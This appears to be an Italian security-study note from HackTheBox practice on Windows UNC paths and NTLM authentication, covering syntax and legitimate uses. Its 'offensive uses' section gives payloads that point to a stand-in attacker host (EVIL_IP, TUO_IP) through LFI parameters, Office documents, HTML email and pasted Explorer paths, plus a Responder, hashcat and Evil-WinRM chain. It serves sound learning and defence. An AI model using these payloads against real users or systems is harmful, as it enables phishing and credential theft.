# UNC Path — Universal Naming Convention

**Categoria:** #windows #network #protocollo  
**Relazioni:** [[SMB]] [[NTLM]] [[HackTheBox/Tools/Responder]] [[LFI - Local File Inclusion]]

---

## 📖 Cos'è

UNC è una sintassi standard di Windows per identificare risorse di rete — file, cartelle, stampanti su altri computer. È il modo in cui Windows "indirizza" risorse remote.

---

## 📐 Sintassi

```
\\SERVER\share\cartella\file.txt
\\192.168.1.10\documenti\report.docx
\\fileserver\backup\
```

Struttura:

```
\\<hostname o IP>\<nome share>\<percorso opzionale>
```

---

## ⚙️ Cosa succede quando Windows vede un UNC path

```
Windows vede \\192.168.1.10\share
        ↓
Risolve l'IP (DNS o LLMNR)
        ↓
Apre connessione SMB sulla porta 445
        ↓
Invia autenticazione NTLM automaticamente
        ↓
Richiede la risorsa
```

> ⚠️ L'autenticazione [[NTLM]] avviene **prima** di verificare se la risorsa esiste — questo è il comportamento sfruttato dagli attaccanti.

---

## 🖥️ Usi legittimi

```bash
# Accedere a file su un altro PC in rete
\\PC-UFFICIO\Documenti\report.xlsx

# Connettere unità di rete
net use Z: \\fileserver\condivisione

# Stampante di rete
\\PRINTSERVER\HP-LaserJet
```

---

## 💥 Usi offensivi

### 1. LFI + UNC path → cattura hash NTLM

```
# Avvia Responder
sudo responder -I tun0

# Inserisci UNC path nel parametro vulnerabile
?page=\\TUO_IP\qualsiasi_nome
```

Windows tenta autenticazione SMB → [[HackTheBox/Tools/Responder]] cattura hash Net-NTLMv2.

### 2. Social Engineering — barra Explorer

```
# La vittima incolla nella barra di Explorer
\\EVIL_IP\share
→ Windows tenta autenticazione automatica
→ hash catturato
```

### 3. Documento Office malevolo

Un documento Word/Excel con un UNC path incorporato triggera autenticazione NTLM automatica quando viene aperto:

```
# Dentro il documento
<img src="\\EVIL_IP\share\logo.png">
→ vittima apre il doc
→ Windows tenta di caricare l'immagine via SMB
→ hash catturato
```

Tecnica molto usata nel **phishing aziendale**.

### 4. Email HTML

```html
<img src="\\EVIL_IP\share\pixel.png">
```

Se il client email renderizza HTML e non blocca UNC path → hash catturato.

---

## 🔗 Perché PHP lo triggera

Quando PHP su Windows esegue:

```php
include("\\\\TUO_IP\\share");
```

Non è PHP che gestisce il path — lo passa al **sistema operativo Windows** sottostante. È Windows che automaticamente tenta la connessione SMB con autenticazione NTLM. PHP non sa nemmeno cosa sta succedendo.

---

## 📚 Lezioni apprese

- UNC path triggera autenticazione NTLM **automaticamente** su qualsiasi applicazione Windows
- Il nome dello share (`\share`, `\test`, `\banana`) è irrilevante — Windows si autentica comunque
- Non è solo LFI — qualsiasi applicazione che passa UNC path al SO è vulnerabile
- Documenti Office con UNC path sono una tecnica comune di phishing aziendale
- Su Linux non esiste questo comportamento — è specifico di Windows

---

## UNC PATH + [[HackTheBox/Tools/Responder]]

Ottima domanda — l'hash che cattura Responder non è una password di sistema, è la password dell'**utente Windows** che ha triggerato la connessione SMB.

---

Quando il server Windows tenta di connettersi a `\\TUO_IP\share`, lo fa nel contesto di un utente specifico — ad esempio:

```
Il processo PHP gira come utente "Administrator"
       ↓
Windows tenta connessione SMB
       ↓
Manda l'hash NTLM di "Administrator"
       ↓
Responder lo cattura
```

Quindi l'hash che ottieni è la password di quell'utente Windows — che potrebbe essere:

- `Administrator`
- Un utente di servizio
- L'utente che sta eseguendo il web server

---

E questo è prezioso perché:

```
Hash catturato
       ↓
Cracking con hashcat → password in chiaro
       ↓
Quella stessa password funziona su Evil-WinRM
       ↓
Shell sulla macchina 🎯
```

Su HTB le macchine sono configurate apposta con password crackabili con rockyou.txt. Nel mondo reale non è sempre così semplice, ma il principio è identico — se l'utente ha una password debole, sei dentro. 🙂

## 🔗 Riferimenti

- [[SMB — Server Message Block]]
- [[NTLM]]
- [[HackTheBox/Tools/Responder]]
- [[LFI — Local File Inclusion]]

---

## Tags

#unc-path #windows #smb #ntlm #responder #lfi #phishing #social-engineering #network